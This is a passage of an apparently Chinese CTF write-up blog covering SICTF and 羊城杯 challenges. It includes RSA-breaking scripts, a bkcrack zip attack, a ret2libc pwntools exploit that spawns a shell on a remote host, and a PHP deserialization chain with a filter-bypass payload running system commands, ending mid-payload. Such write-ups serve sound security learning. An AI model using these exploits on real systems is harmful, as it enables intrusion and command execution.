class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line">hint1 = <span class="number">564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line">hint2 = <span class="number">484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line">c = <span class="number">57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>,<span class="number">2</span>**<span class="number">13</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q=gcd(a*hint1-b*hint2,n)</span><br><span class="line">    <span class="keyword">if</span> q!=<span class="number">1</span> <span class="keyword">and</span> q!=n:</span><br><span class="line">        <span class="built_in">print</span>(q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p = n//q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437</span></span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h2><p>参考： <a href="https://blog.csdn.net/shuaicenglou3032/article/details/119930783">CTF中的RSA套路之低加密指数攻击和低解密指数攻击_KogRow的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N // n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="comment"># e, n, c</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">n1 = <span class="number">14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923</span></span><br><span class="line">n2 = <span class="number">16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499</span></span><br><span class="line">n3 = <span class="number">12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681</span></span><br><span class="line">c1 = <span class="number">786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602</span></span><br><span class="line">c2 = <span class="number">14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350</span></span><br><span class="line">c3 = <span class="number">3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855</span></span><br><span class="line"></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">zip</span>(c, n))</span><br><span class="line">x, n = CRT(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>, <span class="number">18</span>):</span><br><span class="line">    e = i</span><br><span class="line">    m = gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits()</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到-Welcome"><a href="#签到-Welcome" class="headerlink" title="[签到]Welcome"></a>[签到]Welcome</h2><p>关注微信公众号并发送”SICTF2023”就可以获得flag辣！</p><h2 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h2><ol><li><p>先是zip伪加密，用winrar修复即可解压出一张图片。</p></li><li><p>用zsteg查看一下图片，可以看到里面隐写了一张图片。</p><p><img src="/SICTF/m_1_1.png"></p></li><li><p>提取出来。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zsteg Pixel_art.png -e &quot;b1,rgb,lsb,xy&quot; -&gt;out.png</span><br></pre></td></tr></table></figure></li><li><p>通过  <a href="https://cn.office-converter.com/png-to-rgb">在线网站</a>，把文件的rgb信息提取出来，可以得到一些.?!。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure></li><li><p>ook编码， <a href="https://www.splitbrain.org/services/ook">在线网站</a> 解码，即可得到flag。</p><p><img src="/SICTF/m_1_2.png"></p></li></ol><h2 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h2><ol><li><p>用Audacity打开附件，发现类似morse的东西。</p><p><img src="/SICTF/m_3_1.png"></p></li><li><p>手抄下来，即可得到一串莫斯。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-.</span><br></pre></td></tr></table></figure></li><li><p>morse在线解码后即可得到flag。</p><p><img src="/SICTF/m_3_2.png"></p></li></ol><h2 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h2><p>参考链接：<a href="https://www.cnblogs.com/zysgmzb/p/16834602.html">https://www.cnblogs.com/zysgmzb/p/16834602.html</a></p><ol><li><p>先把png的头写到一个文件内。</p><p><img src="/SICTF/m_4_1.png"></p></li><li><p>bkcrack攻击。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -c flag.png -p plan.out -o 0</span><br></pre></td></tr></table></figure><p><img src="/SICTF/m_4_2.png"></p></li><li><p>提取出flag.png。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</span><br></pre></td></tr></table></figure><p><img src="/SICTF/m_4_3.png"></p></li><li><p>最后在png的尾部看到flag。</p><p><img src="/SICTF/m_4_4.png"></p></li></ol><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="签到-Shop"><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h2><p>根据题目描述，nc连上输入几个-1即可拿到flag</p><h2 id="Different-gadget"><a href="#Different-gadget" class="headerlink" title="Different_gadget"></a>Different_gadget</h2><p>利用read的rdx和rsi残留，ret2write，调用write泄露大量地址，从而获取libc基地址，然后第二次read去getshell即可。完整exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ckyan.pwn.my_script <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;attachment&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> binary != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    lib = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;210.44.151.51&quot;</span></span><br><span class="line">    port = <span class="string">&quot;10268&quot;</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    lib = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">init(lib, binary, p)</span><br><span class="line">context = init_context(<span class="string">&quot;tmux&quot;</span>, debug)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lib != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug <span class="keyword">and</span> local:</span><br><span class="line">    ggdb()</span><br><span class="line"></span><br><span class="line">name     = <span class="keyword">lambda</span> obj : [name <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">if</span> <span class="built_in">globals</span>()[name] <span class="keyword">is</span> obj][<span class="number">0</span>]</span><br><span class="line">set_libc = <span class="keyword">lambda</span> buf : set_libc_base_and_log(name(buf), buf)</span><br><span class="line">lg       = <span class="keyword">lambda</span> buf : log_addr(name(buf), buf)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">rwp_addr = <span class="number">0x404800</span></span><br><span class="line"></span><br><span class="line">pad1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">pad1 += <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">pad1 += p64(rwp_addr)</span><br><span class="line">pad1 += p64(<span class="number">0x4011CE</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># D()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Hello!!!&#x27;</span>)</span><br><span class="line">s(pad1)</span><br><span class="line"></span><br><span class="line">r(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = r7f()</span><br><span class="line">lg(leak_addr)</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">128</span></span><br><span class="line">libc = lg(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ret = gadget(&quot;ret&quot;)</span></span><br><span class="line"><span class="comment"># pop_rdi_ret = gadget(&quot;pop rdi;ret&quot;)</span></span><br><span class="line"></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = srch(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pad2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">pad2 += <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">pad2 += p64(rwp_addr)</span><br><span class="line">pad2 += p64(ret)</span><br><span class="line">pad2 += p64(pop_rdi_ret)</span><br><span class="line">pad2 += p64(bin_sh_addr)</span><br><span class="line">pad2 += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># D()</span></span><br><span class="line"></span><br><span class="line">s(pad2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
          <category> SICTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯</title>
      <link href="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
      <url>/%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="D0n’t-pl4y-g4m3"><a href="#D0n’t-pl4y-g4m3" class="headerlink" title="D0n’t pl4y g4m3!!!"></a>D0n’t pl4y g4m3!!!</h2><ol><li><p>打开网页，访问<code>/p0p.php</code>，302跳转到一个游戏页面去了。</p></li><li><p>抓包发现php的版本是<code>7.4.21</code>，这个版本的php能读源码，还发现有一个hint.zip。</p></li><li><p>下载hint.zip，解压后在<code>hint.txt</code>文件中得到这样一串东西。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ö_0 0vO Ow0 0w0 Ö_0 Ö_O Ö.O o_o 0.O OvO o.0 owo o.Ö Ö.Ö Ovo 0_Ö Ö_o owO O.0 owo Ö_o owO O.0 owo Ö_0 0wÖ O.0 0w0 Ö_0 OwO ov0 owo o_O O.Ö Övo </span><br></pre></td></tr></table></figure></li><li><p>利用在线网站（<a href="https://zdjd.vercel.app/%EF%BC%89%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E6%8F%90%E7%A4%BA%E3%80%82">https://zdjd.vercel.app/），即可得到提示。</a></p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_3.png"></p></li><li><p>构造包读取源码。</p><p>数据包：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /p0p.php HTTP/1.1</span><br><span class="line">Host: tcp.cloud.dasctf.com:24054</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_1.png"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>分析源码，能够知道可以利用<code>Yang</code>这个类的<code>__call</code>来rce。</p></li><li><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call1&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call2&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call3&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($name);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ary</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;rce.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;rce.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Bei</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;rce=<span class="string">&quot;cat /tmp/catcatf1ag.txt&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;rce1=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF-&gt;finish=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;now[<span class="string">&quot;YCB1&quot;</span>]=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;finish=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;123&quot;;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>之后将<code>system</code>双写，即可绕过<code>prohib</code>。</p></li><li><p>最后的payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF=O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;rce&quot;;s:23:&quot;cat 